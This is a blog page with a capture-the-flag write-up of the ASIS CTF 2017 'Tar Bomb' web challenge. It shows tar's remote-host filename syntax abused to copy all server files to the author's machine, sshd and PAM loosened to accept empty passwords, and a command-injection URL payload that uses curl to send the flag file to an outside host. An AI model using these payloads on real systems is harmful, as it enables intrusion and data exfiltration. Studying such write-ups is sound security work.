@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html lang="de-de">
+
+<head>
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="chrome=1">
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="referrer" content="no-referrer">
+<meta name="description" content="Don&#39;t panic">
+
+<base href="http://robinverton.de/">
+<title>
+
+
+     ASIS CTF 2017, Tar Bomb, Web129 
+
+</title>
+<link rel="canonical" href="http://robinverton.de/ctf/asisctf-2017-tar-bomb-web129/">
+
+
+
+
+
+
+
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.8.0/styles/default.min.css">
+
+
+
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,700|Ubuntu+Mono:400,400i,700,700i|Raleway:500">
+
+
+
+    
+    <link rel="stylesheet" href="http://robinverton.de/css/reset.css?t=1491743926">
+    <link rel="stylesheet" href="http://robinverton.de/css/pygments.css?t=1491743926">
+    <link rel="stylesheet" href="http://robinverton.de/css/main.css?t=1491743926">
+    
+        <link rel="stylesheet" href="http://robinverton.de/css/override.css?t=1491743926">
+    
+
+
+
+
+<link rel="shortcut icon"
+
+    href="http://robinverton.de/img/leaf.ico"
+
+>
+
+
+
+
+
+
+</head>
+
+
+<body lang="en">
+
+<section class="header">
+    <div class="container">
+        <div class="content">
+            
+            <a href="http://robinverton.de/"><div class="name">Robin Verton</div></a>
+            
+            <nav>
+                <ul>
+                    <li class="nav-blog"><a href="http://robinverton.de/blog/">Blog</a></li>
+                    
+                    <li class="nav-code"><a href="http://robinverton.de/stuff/">Stuff</a></li>
+                </ul>
+            </nav>
+        </div>
+    </div>
+</section>
+
+<section class="icons">
+    <div class="container">
+        <div class="content">
+
+        
+            <a href="//github.com/rverton" target="_blank" rel="noopener"><img class="icon" src="http://robinverton.de/img/github.svg" alt="github" /></a>
+        
+
+        
+            <a href="//twitter.com/robinverton" target="_blank" rel="noopener"><img class="icon" src="http://robinverton.de/img/twitter.svg" alt="twitter" /></a>
+        
+
+        
+
+        
+
+        
+
+        
+            <a href="mailto:hello@robinverton.de"><img class="icon" src="http://robinverton.de/img/email.svg" alt="email" /></a>
+        
+
+        
+            <a href="http://robinverton.de/index.xml"><img class="icon" src="http://robinverton.de/img/rss.svg" alt="rss" /></a>
+        
+        </div>
+    </div>
+</section>
+
+<section class="main">
+    <div class="container">
+        <div class="content">
+            <div class="page-heading">
+
+    ASIS CTF 2017, Tar Bomb, Web129
+
+</div>
+
+            <div class="markdown">
+                
+
+<p>This was not a typical web challenge, apart from beeing accessible over the web. The aim was to successfully execute a tar command (and do something usefull with it). The returned code of executed tar command was then returned to the user. I always got a &ldquo;tar returned 2&rdquo;, meaning that the file I was trying to (un)tar was not found. Chars to travers or inject were all filtered.</p>
+
+<p><img src="http://robinverton.de/static/ctf/asis2017-web129-1.png" alt="" /></p>
+
+<p>I tried different techniques of command injection, but had not success with this. So I dug into the man pages of tar and found this nice little thing:</p>
+
+<pre><code>     --force-local
+           archive file is local even if it has a colon
+</code></pre>
+
+<p>This brought me onto the track that there may be a way to define a remote (tape) device to (un)tar from and to. And yeah, I was <a href="ftp://ftp.gnu.org/old-gnu/Manuals/tar/html_node/tar_127.html">right</a>:</p>
+
+<pre><code class="language-plain">If the file name contains a `:', it is interpreted as `hostname:file name'. If the hostname contains an at sign (@), it is treated as `user@hostname:file name'. In either case, tar will invoke the command rsh (or remsh) to start up an `/etc/rmt' on the remote machine.
+
+If you give an alternate login name, it will be given to the rsh. Naturally, the remote machine must have an executable `/etc/rmt'. This program is free software from the University of California, and a copy of the source code
+can be found with the sources for tar; it's compiled and installed by default.
+</code></pre>
+
+<p>Great, so let&rsquo;s try it. To verify this, I passed <code>tar tvf foo@unlink.io:foobar.tar</code> and watched the auth.log on my server. And yeah, there was a failed connection attempt.</p>
+
+<h3 id="allowing-remote-access">Allowing remote access</h3>
+
+<p>The next step was allowing the remote server to log in. This took me longer than I thought, because setting up an insecure sshd is hard. I created a user with no password (<code>passwd -d username</code>) and allowed login with an (empty) password in my sshd_config:</p>
+
+<pre><code class="language-plain">PermitEmptyPasswords no
+PasswordAuthentication yes
+</code></pre>
+
+<p>But I was still not able to login via an empty password over ssh. Why? After searching for a long time I came around this <a href="https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=93200&amp;repeatmerged=yes">debian bug report</a>. The TLDR of it: <code>ssh</code> is not a secure tty, so you have to tell <code>pam.d</code> that it is okay to pass an empty password (replace <em>nullok_securer</em> with <em>nullok</em> in <em>/etc/pam.d/common-auth</em>).</p>
+
+<h3 id="getting-all-files">Getting all files</h3>
+
+<p>So I felt I was near the finish. I prepared the sshd and build a command to tar me every file from the remote server and place the .tar on my server:</p>
+
+<pre><code>tar cf pwn@myserver:foo.tar *
+</code></pre>
+
+<p><img src="http://robinverton.de/static/ctf/asis2017-web129-2.png" alt="" /></p>
+
+<p>Got it! But where is the flag? .. So as you can see, this was still not the end.</p>
+
+<h3 id="the-real-web-challenge">The real web challenge</h3>
+
+<p>After inspecting the PHP files, this was the basic functionality of them:</p>
+
+<p><strong>admin_console.php</strong>
+After checking existence of a cookie and a proof of work (MD5 brute), send a URL to a phantomjs script.
+<script src="//gist.github.com/rverton/248a03afb0f7f5451fa253feb8a3b440.js"></script></p>
+
+<p><strong>readflag.php</strong>: If REMOTE_ADDR is localhost, open /flag and print it.
+<script src="//gist.github.com/rverton/7f94b907a39ec2e063f843bdd80dc754.js"></script></p>
+
+<p>Note: I will not go into the detail of the substr(md5(str), 0, 6) proof of work here.</p>
+
+<p>So the plan was to use the worker.js script to extract the flag. But it was not printed out, so what can we do here? If we look closely at the regex for the URL, we see that there is no end specified, thus allowing us to inject commands after a valid url.</p>
+
+<p>Lets try to pass the output of the worker.js script to us via curl (nc was not available):</p>
+
+<p><img src="http://robinverton.de/static/ctf/asis2017-web129-3.png" alt="" /></p>
+
+<p><img src="http://robinverton.de/static/ctf/asis2017-web129-4.png" alt="" /></p>
+
+<p>All right, still no flag. So screw this worker.js, let&rsquo;s do it all by ourself instead:</p>
+
+<pre><code class="language-bash">https://127.0.0.1' | curl http://127.0.0.1/readflag.php &gt; /tmp/foo &amp;&amp; curl -F &quot;foo=@/tmp/foo&quot; http://unlink.io:31337/ #
+</code></pre>
+
+<p><img src="http://robinverton.de/static/ctf/asis2017-web129-6.png" alt="" /></p>
+
+            </div>
+        </div>
+    </div>
+</section>
+
+
+
+
+  <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.8.0/highlight.min.js"></script>
+  
+
+  <script type="text/javascript">
+    hljs.initHighlightingOnLoad();
+  </script>
+
+
+
+</body>
+</html>
+
